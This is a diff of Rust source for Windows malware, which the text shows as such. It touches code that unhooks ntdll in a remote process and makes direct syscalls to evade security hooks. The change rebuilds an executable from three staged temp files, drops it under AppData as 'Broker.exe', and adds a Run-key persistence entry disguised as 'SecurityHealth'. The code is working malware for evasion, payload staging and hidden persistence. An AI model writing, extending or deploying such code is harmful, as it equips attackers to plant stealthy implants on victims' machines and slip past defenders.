@@ -332,100 +332,107 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
     }
 }
 
-fn copy_self(dest_path: &str) -> Option<()> {
-    let current_exe = std::env::current_exe().ok()?;
-    let current_exe_str = format!("\\??\\{}", current_exe.to_str()?);
-    let mut current_exe_u16: Vec<u16> = current_exe_str.encode_utf16().collect();
-    current_exe_u16.push(0);
+fn reconstruct_exe(dest_path: &str) -> Option<()> {
+    let temp_dir = std::env::temp_dir();
+    let files = ["1.tmp", "2.tmp", "3.tmp"];
+    let mut combined_bytes = Vec::new();
+
+    let nt_create_file_syscall = syscall::get_syscall_number("NtCreateFile")?;
+    let nt_read_file_syscall = syscall::get_syscall_number("NtReadFile")?;
+    let nt_query_info_file_syscall = syscall::get_syscall_number("NtQueryInformationFile")?;
+    let nt_write_file_syscall = syscall::get_syscall_number("NtWriteFile")?;
+    let nt_close_syscall = syscall::get_syscall_number("NtClose")?;
+
+    for file_name in files {
+        let file_path = temp_dir.join(file_name);
+        let file_path_str = format!("\\??\\{}", file_path.to_str()?);
+        let mut file_path_u16: Vec<u16> = file_path_str.encode_utf16().collect();
+        file_path_u16.push(0);
+
+        let mut handle: HANDLE = 0;
+        let mut io_status = IO_STATUS_BLOCK::default();
+        let mut name = UNICODE_STRING {
+            Length: ((file_path_u16.len() - 1) * 2) as u16,
+            MaximumLength: (file_path_u16.len() * 2) as u16,
+            Buffer: file_path_u16.as_mut_ptr(),
+        };
+        let mut attr = OBJECT_ATTRIBUTES {
+            Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
+            RootDirectory: 0,
+            ObjectName: &mut name,
+            Attributes: OBJ_CASE_INSENSITIVE as u32,
+            SecurityDescriptor: std::ptr::null_mut(),
+            SecurityQualityOfService: std::ptr::null_mut(),
+        };
+
+        let status = unsafe {
+            asm_nt_create_file(
+                &mut handle,
+                FILE_GENERIC_READ,
+                &mut attr,
+                &mut io_status,
+                std::ptr::null_mut(),
+                FILE_ATTRIBUTE_NORMAL,
+                FILE_SHARE_READ,
+                FILE_OPEN,
+                FILE_SYNCHRONOUS_IO_NONALERT,
+                std::ptr::null_mut(),
+                0,
+                nt_create_file_syscall,
+            )
+        };
+        if status != 0 { continue; }
+
+        let mut fsi = FILE_STANDARD_INFO {
+            AllocationSize: 0,
+            EndOfFile: 0,
+            NumberOfLinks: 0,
+            DeletePending: 0,
+            Directory: 0,
+        };
+        unsafe {
+            asm_nt_query_information_file(
+                handle,
+                &mut io_status,
+                &mut fsi as *mut _ as *mut _,
+                mem::size_of::<FILE_STANDARD_INFO>() as u32,
+                FileStandardInfo as u32,
+                nt_query_info_file_syscall,
+            );
+        }
+        let file_size = fsi.EndOfFile as usize;
+        let mut buffer = vec![0u8; file_size];
+        unsafe {
+            asm_nt_read_file(
+                handle,
+                0,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                &mut io_status,
+                buffer.as_mut_ptr() as *mut _,
+                file_size as u32,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                nt_read_file_syscall,
+            );
+            asm_nt_close(handle, nt_close_syscall);
+        }
+        combined_bytes.extend_from_slice(&buffer);
+    }
+
+    if combined_bytes.is_empty() { return None; }
 
     let dest_exe_str = format!("\\??\\{}", dest_path);
     let mut dest_exe_u16: Vec<u16> = dest_exe_str.encode_utf16().collect();
     dest_exe_u16.push(0);
 
-    let nt_create_file_syscall = syscall::get_syscall_number("NtCreateFile")?;
-    let nt_read_file_syscall = syscall::get_syscall_number("NtReadFile")?;
-    let nt_write_file_syscall = syscall::get_syscall_number("NtWriteFile")?;
-    let nt_query_info_file_syscall = syscall::get_syscall_number("NtQueryInformationFile")?;
-    let nt_close_syscall = syscall::get_syscall_number("NtClose")?;
-
-    let mut src_handle: HANDLE = 0;
     let mut dest_handle: HANDLE = 0;
     let mut io_status = IO_STATUS_BLOCK::default();
-
-    let mut src_name = UNICODE_STRING {
-        Length: ((current_exe_u16.len() - 1) * 2) as u16,
-        MaximumLength: (current_exe_u16.len() * 2) as u16,
-        Buffer: current_exe_u16.as_mut_ptr(),
-    };
-
-    let mut src_attr = OBJECT_ATTRIBUTES {
-        Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
-        RootDirectory: 0,
-        ObjectName: &mut src_name,
-        Attributes: OBJ_CASE_INSENSITIVE as u32,
-        SecurityDescriptor: std::ptr::null_mut(),
-        SecurityQualityOfService: std::ptr::null_mut(),
-    };
-
-    let status = unsafe {
-        asm_nt_create_file(
-            &mut src_handle,
-            FILE_GENERIC_READ,
-            &mut src_attr,
-            &mut io_status,
-            std::ptr::null_mut(),
-            FILE_ATTRIBUTE_NORMAL,
-            FILE_SHARE_READ,
-            FILE_OPEN,
-            FILE_SYNCHRONOUS_IO_NONALERT,
-            std::ptr::null_mut(),
-            0,
-            nt_create_file_syscall,
-        )
-    };
-    if status != 0 { return None; }
-
-    let mut fsi = FILE_STANDARD_INFO {
-        AllocationSize: 0,
-        EndOfFile: 0,
-        NumberOfLinks: 0,
-        DeletePending: 0,
-        Directory: 0,
-    };
-    unsafe {
-        asm_nt_query_information_file(
-            src_handle,
-            &mut io_status,
-            &mut fsi as *mut _ as *mut _,
-            mem::size_of::<FILE_STANDARD_INFO>() as u32,
-            FileStandardInfo as u32,
-            nt_query_info_file_syscall,
-        );
-    }
-    let file_size = fsi.EndOfFile as usize;
-
-    let mut buffer = vec![0u8; file_size];
-    unsafe {
-        asm_nt_read_file(
-            src_handle,
-            0,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            &mut io_status,
-            buffer.as_mut_ptr() as *mut _,
-            file_size as u32,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            nt_read_file_syscall,
-        );
-    }
-
     let mut dest_name = UNICODE_STRING {
         Length: ((dest_exe_u16.len() - 1) * 2) as u16,
         MaximumLength: (dest_exe_u16.len() * 2) as u16,
         Buffer: dest_exe_u16.as_mut_ptr(),
     };
-
     let mut dest_attr = OBJECT_ATTRIBUTES {
         Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: 0,
@@ -451,10 +458,7 @@ fn copy_self(dest_path: &str) -> Option<()> {
             nt_create_file_syscall,
         )
     };
-    if status != 0 {
-        unsafe { asm_nt_close(src_handle, nt_close_syscall); }
-        return None;
-    }
+    if status != 0 { return None; }
 
     unsafe {
         asm_nt_write_file(
@@ -463,16 +467,12 @@ fn copy_self(dest_path: &str) -> Option<()> {
             std::ptr::null_mut(),
             std::ptr::null_mut(),
             &mut io_status,
-            buffer.as_ptr() as *const _,
-            file_size as u32,
+            combined_bytes.as_ptr() as *const _,
+            combined_bytes.len() as u32,
             std::ptr::null_mut(),
             std::ptr::null_mut(),
             nt_write_file_syscall,
         );
-    }
-
-    unsafe {
-        asm_nt_close(src_handle, nt_close_syscall);
         asm_nt_close(dest_handle, nt_close_syscall);
     }
 
@@ -507,7 +507,7 @@ fn get_user_sid() -> Option<String> {
 
 fn set_persistence(exe_path: &str) -> Option<()> {
     let sid = get_user_sid()?;
-    let key_path = format!("\\Registry\\User\\{}\\Environment", sid);
+    let key_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", sid);
 
     let mut key_path_u16: Vec<u16> = key_path.encode_utf16().collect();
     key_path_u16.push(0);
@@ -542,7 +542,7 @@ fn set_persistence(exe_path: &str) -> Option<()> {
     };
     if status != 0 { return None; }
 
-    let value_name_str = "UserInitMprLogonScript";
+    let value_name_str = "SecurityHealth";
     let mut value_name_u16: Vec<u16> = value_name_str.encode_utf16().collect();
     value_name_u16.push(0);
     let mut value_name = UNICODE_STRING {
@@ -604,7 +604,7 @@ fn main() {
     let app_data = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\".to_string());
     let dest_path = format!("{}\\Microsoft\\Windows\\Broker.exe", app_data);
 
-    if let Some(_) = copy_self(&dest_path) {
+    if let Some(_) = reconstruct_exe(&dest_path) {
         set_persistence(&dest_path);
     }
 
